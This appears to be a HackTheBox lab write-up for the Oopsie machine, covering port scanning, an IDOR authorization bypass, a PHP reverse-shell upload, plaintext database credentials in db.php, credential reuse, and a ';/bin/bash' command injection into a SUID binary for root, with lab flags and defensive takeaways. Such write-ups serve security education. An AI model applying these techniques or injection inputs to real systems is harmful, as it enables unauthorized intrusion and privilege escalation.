# Oopsie

This is a HackTheBox Starting Point lab focused on web enumeration, insecure direct object references, broken authorization, unrestricted PHP upload, exposed database credentials, credential reuse, and SUID command injection.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Oopsie |
| Target | `10.129.139.73` |
| Operating System | Ubuntu Linux |
| Initial Vector | IDOR and client-controlled authorization values |
| Initial Shell | Uploaded PHP reverse shell as `www-data` |
| User Access | Reused database credentials for `robert` |
| Privilege Escalation | Command injection in SUID `bugtracker` |
| Testing Date | 2026-09-18 |

## Reconnaissance

I started with RustScan and passed the discovered ports to Nmap for default scripts and service detection:

```bash
target=10.129.139.73
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The target exposed SSH and HTTP:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

## Web Enumeration

I enumerated common directories with Gobuster:

```bash
gobuster dir -u "http://$target/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 64
```

Relevant results included:

```text
/index.php    200
/uploads      301
/css          301
/images       301
/js           301
/themes       301
```

Reviewing the site map in Burp Suite revealed a login application at:

```text
/cdn-cgi/login/
```

The application allowed a guest login.

## IDOR and Authorization Bypass

After signing in as a guest, I enumerated the application's account and administrative requests. A user identifier was controlled by the client and could be changed to reference the administrator account.

I obtained the administrator's identifier through IDOR behavior and replaced the guest user's value with the administrator value using the browser inspector. The server trusted the modified client-side value and allowed access to the restricted upload page.

The exact guest and administrator identifier values were not retained in the source notes, but the resulting administrative page access was confirmed.

## PHP File Upload and Initial Access

The restricted upload functionality accepted a PHP reverse-shell file named `shell.php`. After uploading and requesting the file from the web-accessible uploads directory, the target connected to the listener:

```bash
nc -lvnp 1337
```

```text
connect to [10.10.15.32] from (UNKNOWN) [10.129.139.73] 51342
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The initial shell ran as the Apache account:

```text
www-data
```

## Credential Discovery

I reviewed the web application's files and found the database configuration:

```bash
cd /var/www/html/cdn-cgi/login
cat db.php
```

```php
$conn = mysqli_connect('localhost', 'robert', 'M3g4C0rpUs3r!', 'garage');
```

This exposed plaintext database credentials for the user `robert`.

## User Access

The source notes next show an interactive shell as the local user `robert`, indicating that the exposed database password was reusable for the operating-system account. The exact transition command was not retained in the captured session.

The user proof was available in Robert's home directory:

```bash
cat ~/user.txt
```

```text
f2c74ee8db7983851ab2a96a44eb7981
```

## SUID Enumeration

I searched for root-owned SUID executables:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

One unusual binary stood out:

```text
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

Because the binary had the SUID bit set and was owned by root, any command-execution flaw inside it would execute with elevated privileges.

## Privilege Escalation

Running `bugtracker` prompted for a bug ID. Supplying a shell separator followed by `/bin/bash` demonstrated command injection:

```bash
/usr/bin/bugtracker
```

```text
Provide Bug ID: ;/bin/bash
cat: /root/reports/: Is a directory
root@oopsie:/usr/bin#
```

The injected command inherited the binary's effective root privileges and returned a root shell.

## Root Flag

```bash
cat /root/root.txt
```

```text
af13b0bee69f8a877c3faf667f7beacf
```

## Attack Path

```text
RustScan and Nmap
        |
        v
HTTP application and SSH discovered
        |
        v
Guest login found at /cdn-cgi/login/
        |
        v
IDOR reveals administrator identifier
        |
        v
Client-side user value changed to administrator
        |
        v
Restricted upload page accessed
        |
        v
PHP reverse shell uploaded and executed
        |
        v
Shell as www-data
        |
        v
Plaintext robert credentials found in db.php
        |
        v
Credential reuse provides robert access
        |
        v
Root-owned SUID bugtracker discovered
        |
        v
Bug ID command injection
        |
        v
Root shell
```

## Key Takeaways

- Authorization decisions must be enforced on the server and must not depend on client-controlled user identifiers.
- IDOR findings can become critical when they expose administrative functions such as file upload.
- Upload controls must block executable server-side files and store uploads outside executable web paths.
- Application credentials should not be stored in plaintext or reused for operating-system accounts.
- Custom SUID programs require careful input handling and should never pass unsanitized input to a shell command.
- The complete compromise depended on chaining access-control, upload, credential-management, and local privilege weaknesses.

## Evidence Limitations

- The exact guest and administrator identifier values were not retained.
- The precise request used to trigger the uploaded PHP file was not retained.
- The command used to transition from `www-data` to `robert` was not retained; the exposed credential and subsequent `robert` shell were recorded.

## Related Report

- [Oopsie Penetration Test Report](../../../reports/hackthebox/oopsie-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
